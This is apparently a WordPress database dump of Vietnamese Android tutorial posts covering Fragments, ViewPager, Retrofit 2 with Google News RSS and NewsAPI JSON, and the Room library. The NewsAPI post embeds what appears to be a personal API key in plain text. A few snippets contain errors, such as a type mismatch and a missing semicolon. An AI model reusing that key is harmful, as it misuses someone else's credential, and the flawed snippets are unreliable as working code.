(310, 1, '2020-06-16 16:13:42', '2020-06-16 16:13:42', '1. Tạo 3 layout (folder: app/res/layout) với background khác nhau (fragment_1.xml, fragment_2.xml, fragment_3.xml)\n-- fragment_1.xml\n<pre>\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<androidx.constraintlayout.widget.ConstraintLayout\n    xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    android:background=\"@android:color/holo_green_dark\"\n    android:layout_width=\"match_parent\"\n    android:layout_height=\"match_parent\">\n\n</androidx.constraintlayout.widget.ConstraintLayout>\n</pre>\n\n2. Tạo package fragment (folder: app/java/com.example.testfragment). Sau đó tạo 3 Class tương ứng trong package: Fragment1.class, Fragment2.class, Fragment3.class\n-- Fragment1.class\n<pre>\npackage com.example.fragmenttest.fragment;\n\nimport android.os.Bundle;\nimport android.view.LayoutInflater;\nimport android.view.View;\nimport android.view.ViewGroup;\n\nimport androidx.annotation.NonNull;\nimport androidx.annotation.Nullable;\nimport androidx.fragment.app.Fragment;\n\nimport com.example.fragmenttest.R;\n\npublic class Fragment1 extends Fragment {\n    @Nullable\n    @Override\n    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {\n        return inflater.inflate(R.layout.fragment_1,container,false);\n    }\n}\n</pre>\n\n3. Tạo Class TestFragmentAdapter.class (folder: app/java/com.example.fragmentest)\n<pre>\npackage com.example.fragmenttest;\n\nimport androidx.annotation.NonNull;\nimport androidx.fragment.app.Fragment;\nimport androidx.fragment.app.FragmentManager;\nimport androidx.fragment.app.FragmentPagerAdapter;\n\npublic class TestFragmentAdapter extends FragmentPagerAdapter {\n    private Fragment[] fragments;\n    public TestFragmentAdapter(@NonNull FragmentManager fm, Fragment ... fragments) {\n        super(fm, FragmentPagerAdapter.BEHAVIOR_RESUME_ONLY_CURRENT_FRAGMENT);\n        this.fragments = fragments;\n    }\n\n    @NonNull\n    @Override\n    public Fragment getItem(int position) {\n        return fragments[position];\n    }\n\n    @Override\n    public int getCount() {\n        return fragments.length;\n    }\n}\n</pre>\n\n4. Tại MainActivity\n<pre>\npackage com.example.fragmenttest;\n\nimport androidx.appcompat.app.AppCompatActivity;\nimport androidx.viewpager.widget.ViewPager;\n\nimport android.os.Bundle;\n\nimport com.example.fragmenttest.fragment.Fragment1;\nimport com.example.fragmenttest.fragment.Fragment2;\nimport com.example.fragmenttest.fragment.Fragment3;\nimport com.google.android.material.tabs.TabLayout;\n\npublic class MainActivity extends AppCompatActivity implements ViewPager.OnPageChangeListener {\n    private ViewPager viewPager;\n    private TestFragmentAdapter testFragmentAdapter;\n    private TabLayout tabLayout;\n    private Fragment1 fragment1 = new Fragment1();\n    private Fragment2 fragment2 = new Fragment2();\n    private Fragment3 fragment3 = new Fragment3();\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n        initView();\n    }\n\n    private void initView() {\n        viewPager = findViewById(R.id.view_page);\n        testFragmentAdapter = new TestFragmentAdapter(getSupportFragmentManager(),fragment1,fragment2,fragment3);\n        viewPager.setAdapter(testFragmentAdapter);\n    }\n\n    @Override\n    public void onPageScrolled(int position, float positionOffset, int positionOffsetPixels) {\n\n    }\n\n    @Override\n    public void onPageSelected(int position) {\n\n    }\n\n    @Override\n    public void onPageScrollStateChanged(int state) {\n\n    }\n}\n</pre>', 'Sử dụng Fragment trong Android', '', 'publish', 'open', 'open', '', 'su-dung-fragment-trong-android', '', '', '2020-06-16 16:13:42', '2020-06-16 16:13:42', '', 0, 'https://duycode.com/?p=310', 0, 'post', '', 0),
(317, 1, '2020-06-20 00:42:39', '2020-06-20 00:42:39', '<h2>I. Link RSS từ Google</h2>\n--XML search: <a href=\"https://news.google.de/news/feeds?pz=1&cf=vi_vn&ned=vi_vn&hl=vi_vn&q=MTP\" rel=\"noopener noreferrer\" target=\"_blank\">https://news.google.de/news/feeds?pz=1&cf=vi_vn&ned=vi_vn&hl=vi_vn&q=MTP</a> \n- Thay \"MTP\" bằng cụm từ khóa tìm kiếm bất kỳ\n- Dùng POSTMAN để kiểm tra API: <a href=\"https://www.postman.com/\" rel=\"noopener noreferrer\" target=\"_blank\">https://www.postman.com/</a>\n- Dạng file RSS thường trông như sau:\n<pre>\n<rss xmlns:media=\"http://search.yahoo.com/mrss/\" version=\"2.0\">\n    <channel>\n        <generator>NFE/5.0</generator>\n        <title>\"MTP\" - Google Tin tức</title>\n        <link>https://news.google.com/search?pz=1&cf=vi_vn&hl=vi&q=MTP&gl=VN&ceid=VN:vi</link>\n        <language>vi</language>\n        <webMaster>news-webmaster@google.com</webMaster>\n        <copyright>2020 Google Inc.</copyright>\n        <lastBuildDate>Mon, 22 Jun 2020 10:51:31 GMT</lastBuildDate>\n        <description>Google Tin tức</description>\n        <item>\n            <title>Sky Tour Movie của Sơn Tùng MTP tốp 7 Trending của Youtube - Báo Pháp Luật TP.HCM</title>\n            <link>https://plo.vn/giai-tri/xem-nghe-doc/sky-tour-movie-cua-son-tung-mtp-top-7-trending-cua-youtube-917039.html</link>\n            <guid isPermaLink=\"false\">CBMia2h0dHBzOi8vcGxvLnZuL2dpYWktdHJpL3hlbS1uZ2hlLWRvYy9za3ktdG91ci1tb3ZpZS1jdWEtc29uLXR1bmctbXRwLXRvcC03LXRyZW5kaW5nLWN1YS15b3V0dWJlLTkxNzAzOS5odG1s0gEA</guid>\n            <pubDate>Sat, 06 Jun 2020 07:00:00 GMT</pubDate>\n            <description><a href=\"https://plo.vn/giai-tri/xem-nghe-doc/sky-tour-movie-cua-son-tung-mtp-top-7-trending-cua-youtube-917039.html\" target=\"_blank\" rel=\"noopener noreferrer\">Sky Tour Movie của Sơn Tùng MTP tốp 7 Trending của Youtube</a>&nbsp;&nbsp;<font color=\"#6f6f6f\">Báo Pháp Luật TP.HCM</font></description>\n            <source url=\"https://plo.vn\">Báo Pháp Luật TP.HCM</source>\n        </item>\n        <item>\n            <title>Sky Tour của Sơn Tùng M-TP: Toàn kể thành công, cố quên thất bại? - Tuổi Trẻ Online</title>\n            <link>https://tuoitre.vn/sky-tour-cua-son-tung-m-tp-toan-ke-thanh-cong-co-quen-that-bai-20200613100020661.htm</link>\n            <guid isPermaLink=\"false\">CBMiZ2h0dHBzOi8vdHVvaXRyZS52bi9za3ktdG91ci1jdWEtc29uLXR1bmctbS10cC10b2FuLWtlLXRoYW5oLWNvbmctY28tcXVlbi10aGF0LWJhaS0yMDIwMDYxMzEwMDAyMDY2MS5odG3SAQA</guid>\n            <pubDate>Sat, 13 Jun 2020 07:00:00 GMT</pubDate>\n            <description><a href=\"https://tuoitre.vn/sky-tour-cua-son-tung-m-tp-toan-ke-thanh-cong-co-quen-that-bai-20200613100020661.htm\" target=\"_blank\" rel=\"noopener noreferrer\">Sky Tour của Sơn Tùng M-TP: Toàn kể thành công, cố quên thất bại?</a>&nbsp;&nbsp;<font color=\"#6f6f6f\">Tuổi Trẻ Online</font></description>\n            <source url=\"https://tuoitre.vn\">Tuổi Trẻ Online</source>\n        </item>\n        <item>.....</item>\n        <item>.....</item>\n        <item>.....</item>\n    </channel>\n</rss>\n\n</pre>\n\n<h2>II. Cấp quyền thư viện Retrofit 2</h2>\n- Trang chủ: <a href=\"https://square.github.io/retrofit/\" rel=\"noopener noreferrer\" target=\"_blank\">https://square.github.io/retrofit/</a>\n<h3>1. Implement thư viện</h3>\n<pre>\n    compileOptions {\n        sourceCompatibility JavaVersion.VERSION_1_8\n        targetCompatibility JavaVersion.VERSION_1_8\n    }\n</pre>\n<pre>\n    implementation \'com.squareup.retrofit2:retrofit:+\'\n    implementation \'com.squareup.retrofit2:converter-simplexml:+\'\n</pre>\n</h3>2. Cấp quyền Internet</h3>\n<pre>\n    <uses-permission android:name=\"android.permission.INTERNET\"/>\n</pre>\n\n\n<h2>III. Tạo các Class theo RSS</h2>\n<h3>1. RssFeed.java</h3>\n<pre>\npackage com.example.retrofitrssgoogle;\n\nimport org.simpleframework.xml.Element;\nimport org.simpleframework.xml.Root;\n\n@Root(name = \"rss\", strict = false)\npublic class RssFeed {\n    @Element\n    private RssChannel channel;\n\n    public RssChannel getChannel() {\n        return channel;\n    }\n}\n\n</pre>\n\n<h3>2. RssChannel.java</h3>\n<pre>\npackage com.example.retrofitrssgoogle;\n\nimport org.simpleframework.xml.ElementList;\nimport org.simpleframework.xml.Root;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\n@Root(name = \"channel\", strict = false)\npublic class RssChannel {\n    @ElementList(inline = true, required = false)\n    private ArrayList<RssItem> items;\n\n    public ArrayList<RssItem> getItems() {\n        return items;\n    }\n}\n</pre>\n\n<h3>3. RssItem.java</h3>\n<pre>\npackage com.example.retrofitrssgoogle;\n\nimport org.simpleframework.xml.Element;\nimport org.simpleframework.xml.Root;\n\n@Root(name = \"item\", strict = false)\npublic class RssItem {\n    @Element\n    private String title;\n    @Element\n    private String link;\n    @Element\n    private String pubDate;\n    @Element\n    private String description;\n\n    public String getTitle() {\n        return title;\n    }\n\n    public String getLink() {\n        return link;\n    }\n\n    public String getPubDate() {\n        return pubDate;\n    }\n\n    public String getDescription() {\n        return description;\n    }\n\n    @Override\n    public String toString() {\n        return title + \'\\n\';\n    }\n}\n\n</pre>\n\n<h2>IV. Tạo class của Retrofit 2</h2>\n<h3>1. interface RetrofitAPI.Class</h3>\n<pre>\npackage com.example.retrofitrssgoogle;\n\nimport retrofit2.Call;\nimport retrofit2.http.GET;\nimport retrofit2.http.Query;\n\npublic interface RetrofitAPI {\n    @GET(\"feeds?pz=1&cf=vi_vn&ned=vi_vn&hl=vi_vn\")\n    Call<RssFeed> getFeed(\n            @Query(\"q\") String q\n    );\n}\n</pre>\n\n<h3>2. RetrofitBuilder.java</h3>\n<pre>\npackage com.example.retrofitrssgoogle;\n\nimport okhttp3.OkHttpClient;\nimport retrofit2.Retrofit;\nimport retrofit2.converter.simplexml.SimpleXmlConverterFactory;\n\npublic class RetrofitBuilder {\n    private static RetrofitAPI retrofitAPI;\n    public static RetrofitAPI getInstance(){\n        if (retrofitAPI == null){\n            Retrofit retrofit = new Retrofit.Builder()\n                    .baseUrl(\"https://news.google.de/news/\")\n                    .client(new OkHttpClient())\n                    .addConverterFactory(SimpleXmlConverterFactory.create())\n                    .build();\n            retrofitAPI = retrofit.create(RetrofitAPI.class);\n        }\n        return retrofitAPI;\n    }\n}\n</pre>\n\n\n<h2>V. Sử dụng</h2>\n<pre>\nString key = \"MTP\";\nRetrofitBuilder.getInstance().getFeed(key).enqueue(new Callback<RssFeed>() {\n    @Override\n    public void onResponse(Call<RssFeed> call, Response<RssFeed> response) {\n        if (response.isSuccessful()){\n            RssFeed rssFeed = response.body();\n            RssChannel rssChannel = rssFeed.getChannel();\n            ArrayList<RssItem> items = rssChannel.getItems();\n            //items chính là List danh sách nhận được để dùng cho RecycleView\n            Toast.makeText(MainActivity.this, items.toString(), Toast.LENGTH_SHORT).show();\n        }\n        else {\n            Toast.makeText(MainActivity.this, \"Request Error\", Toast.LENGTH_SHORT).show();\n        }\n    }\n\n    @Override\n    public void onFailure(Call<RssFeed> call, Throwable t) {\n        if (call.isCanceled()){\n            Toast.makeText(MainActivity.this, \"Call was cancelled forcefully\", Toast.LENGTH_SHORT).show();\n        }\n        else {\n            Toast.makeText(MainActivity.this, \"Network Error\", Toast.LENGTH_SHORT).show();\n        }\n    }\n });\n</pre>\n', 'Retrofit 2 - Nhận dữ liệu từ Google - RSS', '', 'publish', 'open', 'open', '', 'retrofit-2-nhan-du-lieu-tu-google-rss', '', '', '2020-06-20 00:42:39', '2020-06-20 00:42:39', '', 0, 'https://duycode.com/?p=317', 0, 'post', '', 0),
(335, 1, '2020-06-22 18:30:23', '2020-06-22 18:30:23', '<h2>I. Link JSON từ NewsAPI</h2>\n- Trang chủ NewsAPI: <a href=\"https://newsapi.org/\" rel=\"noopener noreferrer\" target=\"_blank\">https://newsapi.org/</a>\n- NewsAPI search: <a href=\"https://newsapi.org/v2/everything?language=vi&apiKey=061a72b6057144bcac23934a0ab49842&q=Messi\" rel=\"noopener noreferrer\" target=\"_blank\">https://newsapi.org/v2/everything?language=vi&apiKey=061a72b6057144bcac23934a0ab49842&q=Messi</a>\n- q=Messi: Thay \"Messi\" bằng cụm từ khóa tìm kiếm bất kỳ\n- apiKey=061a72b6057144bcac23934a0ab49842: apiKey chính là key của NewsAPI cung cấp khi đăng ký tài khoản.\n- Kết quả trả về ở dạng Json như sau\n<pre>\n{\n  \"status\": \"ok\",\n  \"totalResults\": 100,\n  \"articles\": [\n    {\n      \"source\": {\n        \"id\": null,\n        \"name\": \"Vnexpress.net\"\n      },\n      \"author\": \"VnExpress\",\n      \"title\": \"Messi phải tập riêng\",\n      \"description\": \"Siêu sao Lionel Messi phải tập hồi phục chấn thương bắp chân phải, trong phòng gym của CLB Barca hôm qua 3/6, theo Marca.\",\n      \"url\": \"https://vnexpress.net/messi-phai-tap-rieng-4110043.html\",\n      \"urlToImage\": \"https://vcdn-thethao.vnecdn.net/2020/06/04/messi-1591207736-7113-1591207844_1200x0.jpg?w=0&h=0&q=100&dpr=2&fit=crop&s=-YXVQmJ4P7YaOtqaHKo4nQ\",\n      \"publishedAt\": \"2020-06-03T22:15:24Z\",\n      \"content\": \"Siêu sao Lionel Messi phi tp hi phc chn thng bp chân phi, trong phòng gym ca CLB Barca hôm qua 3/6, theo Marca.Các cu th còn li ca Barca tp cùng nhau trên khu tp luyn Tito Vilanova, chun b cho vòng 2… [+863 chars]\"\n    },\n    {\n      \"source\": {\n        \"id\": null,\n        \"name\": \"Vnexpress.net\"\n      },\n      \"author\": \"VnExpress\",\n      \"title\": \"Setien: \'Messi không chỉ ghi bàn\'\",\n      \"description\": \"HLV Barca Quique Setien ca ngợi đóng góp của Lionel Messi trên nhiều khía cạnh.\",\n      \"url\": \"https://vnexpress.net/setien-messi-khong-chi-ghi-ban-4116153.html\",\n      \"urlToImage\": \"https://vcdn-thethao.vnecdn.net/2020/06/16/untitled-1592250193-3876-1592250235_1200x0.jpg?w=0&h=0&q=100&dpr=2&fit=crop&s=l4l5TtyGwbM9G6aIEk4Xxg\",\n      \"publishedAt\": \"2020-06-15T23:15:11Z\",\n      \"content\": \"HLV Barca Quique Setien ca ngi óng góp ca Lionel Messi trên nhiu khía cnh.\\\"Bn không th ch ánh giá Messi qua nhng bàn thng cu y ghi. Messi còn có nhng óng góp khác, nh kin to. iu ó mang li nhiu im s c… [+1648 chars]\"\n    },\n    {\n      \"key\": \"value\"\n    },\n    {\n      \"key\": \"value\"\n    },\n    {\n      \"key\": \"value\"\n    }\n  ]\n}\n</pre>\n\n<h2>II. Cấp quyền thư viện Retrofit 2</h2>\n- Trang chủ: <a href=\"https://square.github.io/retrofit/\" rel=\"noopener noreferrer\" target=\"_blank\">https://square.github.io/retrofit/</a>\n\n<h3>1. Implement thư viện</h3>\n<pre>\n    compileOptions {\n        sourceCompatibility JavaVersion.VERSION_1_8\n        targetCompatibility JavaVersion.VERSION_1_8\n    }\n</pre>\n<pre>\n    implementation \'com.squareup.retrofit2:retrofit:+\'\n    implementation \'com.squareup.retrofit2:converter-gson:+\'\n</pre>\n</h3>2. Cấp quyền Internet</h3>\n<pre>\n    <uses-permission android:name=\"android.permission.INTERNET\"/>\n</pre>\n\n<h2>III. Tạo các Class theo JSON</h2>\n<h3>1. JsonArticles.class</h3>\n<pre>\npackage com.example.firstproject;\n\nimport com.google.gson.annotations.SerializedName;\n\nimport java.util.ArrayList;\n\npublic class JsonArticles{\n    @SerializedName(\"articles\")\n    private ArrayList<JsonItem> items;\n\n    public ArrayList<JsonItem> getItems() {\n        return items;\n    }\n}\n</pre>\n\n<h3>3. JsonItem.java</h3>\n<pre>\npackage com.example.firstproject;\n\nimport com.google.gson.annotations.SerializedName;\n\npublic class JsonItem{\n    @SerializedName(\"title\")\n    private String title;\n    @SerializedName(\"description\")\n    private String desc;\n    @SerializedName(\"url\")\n    private String url;\n    @SerializedName(\"urlToImage\")\n    private String image;\n    @SerializedName(\"publishedAt\")\n    private String pubDate;\n\n    public String getTitle() {\n        return title;\n    }\n\n    public String getDesc() {\n        return desc;\n    }\n\n    public String getUrl() {\n        return url;\n    }\n\n    public String getImage() {\n        return image;\n    }\n\n    public String getPubDate() {\n        return pubDate;\n    }\n\n    @Override\n    public String toString() {\n        return title + \'\\n\';\n    }\n\n}\n</pre>\n\n<h2>III. Tạo class của Retrofit 2</h2>\n<h3>1. interface RetrofitAPI.class</h3>\n<pre>\npackage com.example.firstproject;\n\nimport retrofit2.Call;\nimport retrofit2.http.GET;\nimport retrofit2.http.Query;\n\npublic interface RetrofitAPI{\n    @GET(\"everything?language=vi\")\n    Call<JsonArticles> getArticles(\n            @Query(\"qInTitle\") String q,\n            @Query(\"apiKey\") String apiKey\n    );\n}\n</pre>\n\n<h3>2. RetrofitBuilder.class</h3>\n<pre>\npackage com.example.firstproject;\n\nimport okhttp3.OkHttpClient;\nimport retrofit2.Retrofit;\nimport retrofit2.converter.gson.GsonConverterFactory;\n\npublic class RetrofitBuilder {\n    private static RetrofitAPI retrofitAPI;\n    public static RetrofitAPI getInstance(){\n        if (retrofitAPI == null){\n            Retrofit retrofit = new Retrofit.Builder()\n                    .baseUrl(\"https://newsapi.org/v2/\")\n                    .client(new OkHttpClient())\n                    .addConverterFactory(GsonConverterFactory.create())\n                    .build();\n            retrofitAPI = retrofit.create(RetrofitAPI.class);\n        }\n        return retrofitAPI;\n    }\n}\n</pre>\n\n\n<h2>V. Sử dụng</h2>\n<pre>\nString apiKey = \"061a72b6057144bcac23934a0ab49842\";\nString search = \"Messi\"\nRetrofitBuilder.getInstance().getArticles(search,apiKey).enqueue(new Callback<JsonArticles>() {\n    @Override\n    public void onResponse(Call<JsonArticles> call, Response<JsonArticles> response) {\n        if (response.isSuccessful()){\n            JsonArticles jsonArticles= response.body();\n            ArrayList<JsonItem> items = jsonArticles.getItems();\n    \n            //items chính là List danh sách nhận được để dùng cho RecycleView\n            Toast.makeText(MainActivity.this, items.toString(), Toast.LENGTH_SHORT).show();\n        }\n        else {\n            Toast.makeText(MainActivity.this, \"Request Error\", Toast.LENGTH_SHORT).show();\n        }\n    }\n\n    @Override\n    public void onFailure(Call<JsonArticles> call, Throwable t) {\n        if (call.isCanceled()){\n            Toast.makeText(MainActivity.this, \"Call was cancelled forcefully\", Toast.LENGTH_SHORT).show();\n        }\n        else {\n            Toast.makeText(MainActivity.this, \"Network Error\", Toast.LENGTH_SHORT).show();\n        }\n    }\n });\n</pre>\n', 'Retrofit 2 - Nhận dữ liệu từ NewsAPI - Json', '', 'publish', 'open', 'open', '', 'retrofit-2-nhan-du-lieu-tu-newsapi-json', '', '', '2020-06-22 18:30:23', '2020-06-22 18:30:23', '', 0, 'https://duycode.com/?p=335', 0, 'post', '', 0),
(357, 1, '2020-06-23 00:42:43', '2020-06-23 00:42:43', 'Room Library: <a href=\"https://developer.android.com/training/data-storage/room\" rel=\"noopener noreferrer\" target=\"_blank\">https://developer.android.com/training/data-storage/room</a>\n\n<h2>1. Implement thư viện</h2>\n<pre>\n  def room_version = \"2.2.5\"\n  implementation \"androidx.room:room-runtime:$room_version\"\n  annotationProcessor \"androidx.room:room-compiler:$room_version\"\n</pre>\n\n<h2>2. Tạo Entity: Student.Class</h2>\n- Class này tương ứng với các trường trong một bảng.\n<pre>\npackage com.example.roomtest;\n\nimport androidx.room.ColumnInfo;\nimport androidx.room.Entity;\nimport androidx.room.PrimaryKey;\n\n@Entity\npublic class Student {\n    @PrimaryKey(autoGenerate = true)\n    private int id;\n    @ColumnInfo\n    private String name;\n    @ColumnInfo\n    private double point;\n\n    public Student(String name, double point) {\n        this.name = name;\n        this.point = point;\n    }\n\n    public int getId() {\n        return id;\n    }\n\n    public void setId(int id) {\n        this.id = id;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public double getPoint() {\n        return point;\n    }\n\n    public void setPoint(double point) {\n        this.point = point;\n    }\n\n    @Override\n    public String toString() {\n        return \"\\n\" + getId() + \" - \" + getName() + \" - \" + getPoint();\n    }\n}\n</pre>\n\n<h2>3. Tạo DAO: StudentDao.Class</h2>\n<pre>\npackage com.example.roomtest;\n\nimport androidx.room.Dao;\nimport androidx.room.Delete;\nimport androidx.room.Insert;\nimport androidx.room.Query;\n\nimport java.util.List;\n\n@Dao\npublic interface StudentDao {\n    @Query(\"SELECT * FROM Student\")\n    List<Student> getAll();\n\n    @Insert\n    void insert(Student student);\n\n    @Query(\"DELETE FROM Student WHERE id = :id\")\n    void delete(int id);\n\n    @Query(\"UPDATE Student SET name=:name, point =:point WHERE id=:id\")\n    void update(int id, String name, double point);\n}\n\n</pre>\n<h2>4. Tạo Database: StudentDatabase.Class\n<pre>\npackage com.example.roomtest;\n\nimport android.content.Context;\n\nimport androidx.room.Database;\nimport androidx.room.Room;\nimport androidx.room.RoomDatabase;\n\n@Database(entities = {Student.class}, version = 1)\npublic abstract class StudentDatabase extends RoomDatabase {\n    private static StudentDatabase studentDatabase;\n    public static StudentDatabase getInstance(Context context){\n        if (studentDatabase == null){\n            studentDatabase = Room.databaseBuilder(\n                    context,\n                    StudentDatabase.class,\n                    \"student_manager\"\n            )\n                    .allowMainThreadQueries()\n                    .build();\n        }\n        return studentDatabase;\n    }\n\n    public abstract StudentDao getStudentDao();\n}\n</pre>\n\n<h2>5. Sử dụng</h2>\n<pre>\n//1. Get List Student\nList<Student> studentList = new ArrayList<>();\nstudentList = StudentDatabase.getInstance(this).getStudentDao().getAll();\n\n//2. Insert Student\nStudent newStudent = new Student(\"Duy\", 9.5);\nStudentDatabase.getInstance(this).getStudentDao().insert(newStudent);\n\n//3. Delete Student\nint numberDel = 10;\nStudentDatabase.getInstance(this).getStudentDao().delete(numberDel);\n\n//4. Update Student\nint numberUpdate = 5;\nStudentDatabase.getInstance(this).getStudentDao().update(numberUpdate ,\"Trang\",8.5);\n</pre>', 'Room Library', '', 'publish', 'open', 'open', '', 'room-library', '', '', '2020-06-23 00:42:43', '2020-06-23 00:42:43', '', 0, 'https://duycode.com/?p=357', 0, 'post', '', 0),
(359, 1, '2020-06-25 17:45:44', '2020-06-25 17:45:44', '** Note: Vòng đời của Fragment\n<img src=\"https://drive.google.com/uc?id=1VURaWEMQQV4h5XDzdnryf0HTAukCDO8Y\" alt=\"Fragment Lifecycle\" />\n<h2>1. Tạo Class Fragment</h2>\n<pre>public class FragmentLogin extends Fragment {\n    private MainActivity mainActivity;\n    @Nullable\n    @Override\n    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {\n        View view = inflater.inflate(R.layout.fragment_login,container,false);\n        return view;\n    }\n\n    @Override\n    public void onActivityCreated(@Nullable Bundle savedInstanceState) {\n        super.onActivityCreated(savedInstanceState);\n        if (getActivity() instanceof MainActivity){\n            mainActivity = (MainActivity) getActivity();\n        }\n        initViews();\n    }\n\n    private void initViews() {\n        //Đoạn code xử lý thêm\n    }\n}\n</pre>\n\n-- Với databinding: giả sử FragmnetSong.class + fragment_song.xml\n<pre>\n    //Tên FragmentSongBinding ứng với tên file: fragment_song.xml có sử dụng binding\n    private FragmentSongBinding frBinding;\n    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {\n        frBinding = DataBindingUtil.inflate(\n                inflater,\n                R.layout.fragment_song,\n                container,\n                false);\n        View view = frBinding.getRoot();\n        return view;\n    }\n</pre>\n<h2>2. FragmentManager và FragmentTransaction</h2>\n-- Mỗi 1 đối tượng fragment chỉ add 1 lần.\n-- Transaction sau khi commit() xong phải khai báo lại.\n<pre>private void initFragment(){\n    FragmentManager fragmentManager = getSupportFragmentManager();\n    FragmentTransaction transaction = fragmentManager.beginTransaction();\n    //transaction.setCustomAnimations(\n    //        android.R.anim.slide_in_left,\n    //        android.R.anim.slide_out_right\n    //);\n    transaction.setCustomAnimations(\n            android.R.animator.fade_in,\n            android.R.animator.fade_out\n    );\n\n    //remove all Fragment, and add \"new Fragment()\";\n    transaction.replace(R.id.frame_container,new Fragment());\n    transaction.add(R.id.frame_container, fragmentA);\n    transaction.add(R.id.frame_container, fragmentB);\n    transaction.add(R.id.frame_container, fragmentC);\n    transaction.remove(fragmentC);\n\n    transaction.hide(fragmentA);\n    transaction.show(fragmentA);\n\n    transaction.commit();\n    transaction.runOnCommit(new Runnable() {\n        @Override\n        public void run() {\n            //đoạn code cần xử lý khi Commit\n        }\n    });\n}\n</pre>\n', 'Fragment - P1: Tạo class Fragment và sử dụng FragmentTransaction', '', 'publish', 'open', 'open', '', 'fragment-p1-tao-class-fragment-va-su-dung-fragmenttransaction', '', '', '2020-06-25 17:45:44', '2020-06-25 17:45:44', '', 0, 'https://duycode.com/?p=359', 0, 'post', '', 0),
(379, 1, '2020-06-27 15:22:30', '2020-06-27 15:22:30', '<h2>1. Implement thư viện</h2>\n<pre>\n    implementation \'com.google.android.material:material:+\'\n</pre>\n<h2>2. Tạo các Class</h2>\n- Tạo Class FragmentA, FragmentB, FragmentC tương ứng layout fragment_a, fragment_b, fragment_c;\n- Tạo Class ViewPagerAdapter\n<pre>\npackage com.example.miniproject.viewpager;\n\nimport androidx.annotation.NonNull;\nimport androidx.annotation.Nullable;\nimport androidx.fragment.app.Fragment;\nimport androidx.fragment.app.FragmentManager;\nimport androidx.fragment.app.FragmentPagerAdapter;\n\npublic class ViewPagerAdapter extends FragmentPagerAdapter {\n    private Fragment[] fragments;\n\n    public ViewPagerAdapter(@NonNull FragmentManager fm, Fragment ... fragments) {\n        super(fm, FragmentPagerAdapter.BEHAVIOR_RESUME_ONLY_CURRENT_FRAGMENT);\n        this.fragments = fragments;\n\n    }\n\n    @NonNull\n    @Override\n    public Fragment getItem(int position) {\n        return fragments[position];\n    }\n\n    @Override\n    public int getCount() {\n        return fragments.length;\n    }\n\n    @Nullable\n    @Override\n    public CharSequence getPageTitle(int position) {\n        switch (position){\n            case 0: return \"FragmentA\";\n            case 1: return \"FragmentB\";\n            case 2: return \"FragmentC\";\n        }\n        return super.getPageTitle(position);\n    }\n}\n</pre>\n\n<h2>3. Tạo activity_main.xml</h2>\n<pre>\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n    xmlns:tools=\"http://schemas.android.com/tools\"\n    android:orientation=\"vertical\"\n    android:layout_width=\"match_parent\"\n    android:layout_height=\"match_parent\"\n    tools:context=\".MainActivity\">\n\n    <com.google.android.material.tabs.TabLayout\n        android:id=\"@+id/tl_news\"\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"wrap_content\"/>\n\n    <androidx.viewpager.widget.ViewPager\n        android:id=\"@+id/vp_news\"\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"wrap_content\">\n        <androidx.viewpager.widget.PagerTabStrip\n            android:layout_width=\"match_parent\"\n            android:layout_height=\"wrap_content\"/>\n    </androidx.viewpager.widget.ViewPager>\n\n</LinearLayout>\n</pre>\n\n<h2>4. Tại MainActivity.class</h2>\n<pre>\npackage com.example.miniproject;\n\nimport androidx.appcompat.app.AppCompatActivity;\nimport androidx.viewpager.widget.ViewPager;\n\nimport android.os.Bundle;\n\nimport com.example.miniproject.viewpager.FavoriteFragment;\nimport com.example.miniproject.viewpager.NewFragment;\nimport com.example.miniproject.viewpager.SavedFragment;\nimport com.example.miniproject.viewpager.ViewPagerAdapter;\nimport com.google.android.material.tabs.TabLayout;\n\npublic class MainActivity extends AppCompatActivity {\n    private ViewPager vpNews;\n    private TabLayout tlNews;\n    private FragmentA fmA = new FragmentA();\n    private FragmentA fmB = new FragmentB();\n    private FragmentA fmC = new FragmentC();\n    private ViewPagerAdapter vpAdapter;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        initView();\n    }\n\n    private void initView() {\n        vpNews = findViewById(R.id.vp_news);\n        tlNews = findViewById(R.id.tl_news);\n        vpAdapter = new ViewPagerAdapter(getSupportFragmentManager(), fmA, fmB, fmC);\n        vpNews.setAdapter(vpAdapter);\n        tlNews.setupWithViewPager(vpNews);\n\n        vpNews.addOnPageChangeListener(new ViewPager.OnPageChangeListener() {\n            @Override\n            public void onPageScrolled(int position, float positionOffset, int positionOffsetPixels) {\n\n            }\n\n            @Override\n            public void onPageSelected(int position) {\n\n            }\n\n            @Override\n            public void onPageScrollStateChanged(int state) {\n\n            }\n        });\n    }\n}\n</pre>', 'Fragment - P2: Hiển thị Fragment theo ViewPager', '', 'publish', 'open', 'open', '', 'fragment-p2-hien-thi-fragment-theo-viewpager', '', '', '2020-06-27 15:22:30', '2020-06-27 15:22:30', '', 0, 'https://duycode.com/?p=379', 0, 'post', '', 0),
